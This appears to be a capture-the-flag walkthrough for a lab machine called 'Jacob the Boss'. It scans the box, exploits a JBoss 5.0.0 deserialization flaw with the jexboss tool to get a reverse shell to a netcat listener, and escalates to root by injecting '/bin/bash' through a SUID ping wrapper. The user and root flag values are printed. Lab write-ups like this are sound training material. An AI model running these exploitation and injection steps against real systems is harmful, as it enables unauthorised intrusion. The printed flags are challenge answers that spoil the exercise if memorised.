# Jacob the Boss

## Description

Find a way in and learn a little more.

Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.

* First of all, add the jacobtheboss.box address to your hosts file.

Anyway, learn a little more, have fun!

## Initial Scan

First add `<MACHINE IP>  jacobtheboss.box` to `/etc/hosts` as the description said. Now let's start with a full port Nmap scan. The scan reveals thirteen open ports:

~~~
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp open  mysql       MariaDB (unauthorized)
4444/tcp open  java-rmi    Java RMI
4445/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Welcome to JBoss&trade;
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
~~~

## port 80

I started with port 80. A Dotclear blog is running on this port. We can go back to it if we don't find any other vulnerability.

## JBoss (port 8080)

A JBoss server is running on this port. If you click on "JBoss Web Console" , You can see the version which is 5.0.0. I searched for the exploits and realized that this version has several deserialization flaws and it is vulnerable to RCE (Remote Code Execution).

### Exploit

I found a tool that automates the discovery of vulnerabilities against JBOSS: https://github.com/joaomatosf/jexboss

Download and install the tool and run it:

~~~
┌──(user㉿Y0B01)-[~/…/thm/Jacob_the_Boss/files/jexboss]
└─$ python jexboss.py -host http://jacobtheboss.box:8080

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://jacobtheboss.box:8080 **

 [*] Checking admin-console:                  [ OK ]
 [*] Checking Struts2:                        [ OK ]
 [*] Checking Servlet Deserialization:        [ OK ]
 [*] Checking Application Deserialization:    [ OK ]
 [*] Checking Jenkins:                        [ OK ]
 [*] Checking web-console:                    [ VULNERABLE ]
 [*] Checking jmx-console:                    [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:              [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "web-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://jacobtheboss.box:8080. Please wait...
~~~

## Reverse shell

At this stage, you can open a listener (`rlwrap nc -lvnp 4444`) and enter your local IP as `RHOST` and your listening port as `RPORT` (it actually should be `LHOST` and `LPORT` but whatever):

~~~
 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.
   IP Address (RHOST): 10.9.2.82
   Port (RPORT): 4444

 * The exploit code was successfully sent. Check if you received the reverse shell
   connection on your server or if your command was executed. 
   Type [ENTER] to continue...



 * Do you want to try to run an automated exploitation via "jmx-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://jacobtheboss.box:8080. Please wait...

  * Successfully deployed code! Starting command shell. Please wait...

~~~

Now we have a shell as user `jacob`:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Jacob_the_Boss/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.2.82] from (UNKNOWN) [10.10.183.234] 46050
bash: no job control in this shell
[jacob@jacobtheboss /]$ id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
~~~

## User flag

Now we can read th user flag in `jacob`'s home directory:

~~~
[jacob@jacobtheboss /]$ cd /home/jacob
[jacob@jacobtheboss ~]$ ls
user.txt
[jacob@jacobtheboss ~]$ cat user.txt
f4d491f280de360cc49e26ca1587cbcc
~~~

user.txt: `f4d491f280de360cc49e26ca1587cbcc`

## Going root

Now we need to obtain the root flag. I tried to dump data from the database, but it was a rabbit hole. Then I used `find` command to find the files owned by root with SUID bit set, and a program looked unsual:

~~~
[jacob@jacobtheboss ~]$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/pingsys   <-----------------------
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh

[REDACTED]
~~~

I started playing around with it and it expects a parameter and as you can guess it is an IP to ping:

~~~
[jacob@jacobtheboss ~]$ /usr/bin/pingsys localhost
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.017 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.027 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.027 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.027 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3000ms
rtt min/avg/max/mdev = 0.017/0.024/0.027/0.006 ms
~~~

It basicly runs `ping -c 4 <IP>`. I tried to run commands by adding a semicolon at the end of it and it worked:

~~~
[jacob@jacobtheboss ~]$ /usr/bin/pingsys localhost;ls    <------
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.016 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.026 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.028 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.025 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.016/0.023/0.028/0.007 ms
user.txt     <--------------
~~~

It has SUID bit set, so we can run bash to switch to root, but if you want to get a root shell, you have to change the format a bit as shown bellow:

~~~
$ /usr/bin/pingsys "localhost;/bin/bash"
~~~

I ran it to go root and also spawned a TTY shell:

~~~
[jacob@jacobtheboss ~]$ /usr/bin/pingsys "localhost;/bin/bash"
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.017 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.030 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.031 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.031 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.017/0.027/0.031/0.007 ms
id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
python -c "import pty;pty.spawn('/bin/bash')"
[root@jacobtheboss /]#
~~~

## Root flag

Now we can head to `/root` and read `root.txt`:

~~~
[root@jacobtheboss /]# cd /root
[root@jacobtheboss root]# ls
anaconda-ks.cfg  jboss.sh  original-ks.cfg  root.txt
[root@jacobtheboss root]# cat root.txt
29a5641eaa0c01abe5749608c8232806
~~~

root.txt: `29a5641eaa0c01abe5749608c8232806`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something.

Have a g00d one! : )